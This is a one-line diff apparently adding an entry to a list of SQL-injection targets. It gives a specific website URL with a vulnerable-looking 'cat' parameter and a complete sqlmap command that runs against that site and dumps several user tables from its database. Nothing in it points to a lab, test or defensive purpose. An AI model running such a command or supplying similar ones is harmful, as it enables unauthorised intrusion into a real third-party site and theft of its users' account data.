@@ -1,0 +1,1 @@
+http://www.cofeos.com.br/categorias.php?cat=6 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.cofeos.com.br/categorias.php?cat=6 -D cofeos -T wvtn6_users,wfs94_users,jom__users --dump
